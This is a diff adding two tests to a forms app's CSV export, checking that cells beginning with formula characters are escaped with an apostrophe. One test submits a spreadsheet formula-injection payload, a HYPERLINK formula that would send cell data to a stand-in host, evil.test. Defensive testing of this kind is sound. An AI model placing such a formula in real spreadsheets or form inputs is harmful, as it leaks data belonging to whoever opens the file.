@@ -131,3 +131,47 @@ test("the table can be narrowed to the ones already in the group", async () => {
   assert.equal(submissionGrid(form.id, { state: "added" })!.rows.length, 1);
   assert.equal(submissionGrid(form.id, { state: "new" })!.rows.length, 1);
 });
+
+test("a formula typed into the public form is text by the time Excel sees it", async () => {
+  const { submissionGrid, gridToCsv } = await import("@/app/lib/forms/report");
+  const { listFields } = await import("@/app/lib/forms/store");
+  const { form } = await cohort();
+
+  // Anyone with the link can type this into a question.
+  const town = listFields(form.id).find((field) => field.mapsTo === "city")!;
+  await register(form.token, form.id, "مهاجِمة", "0521110010", {
+    fieldId: town.id,
+    value: '=HYPERLINK("http://evil.test?x="&A1,"اضغط")'
+  });
+
+  const csv = gridToCsv(submissionGrid(form.id)!);
+  const cell = csv.split("\r\n")[1].split('","').find((part) => part.includes("HYPERLINK"))!;
+
+  assert.ok(cell.startsWith("'="), `the cell is marked as text — got ${cell.slice(0, 20)}`);
+  assert.ok(!csv.includes('"=HYPERLINK'), "no cell opens with = where Excel would run it");
+});
+
+test("the same guard for every opener Excel treats as a formula", async () => {
+  const { gridToCsv } = await import("@/app/lib/forms/report");
+
+  const grid = {
+    formId: 1,
+    formName: "x",
+    groupName: "y",
+    columns: ["س"],
+    rows: ["=1+1", "+1", "-1", "@SUM(A1)", "\tx", "عادي", "+972521234567"].map((value, index) => ({
+      submissionId: index,
+      memberId: null,
+      state: "new",
+      submittedAt: "2026-10-11 10:00",
+      cells: [value]
+    }))
+  };
+
+  const lines = gridToCsv(grid).trimEnd().split("\r\n").slice(1);
+  for (const line of lines.slice(0, 5)) {
+    assert.ok(line.includes(`"'`), `an opener slipped through: ${line}`);
+  }
+  assert.ok(lines[5].endsWith('"عادي"'), "ordinary text is left alone");
+  assert.ok(lines[6].includes(`"'+972521234567"`), "a phone is neutralised too, and Excel still shows it whole");
+});
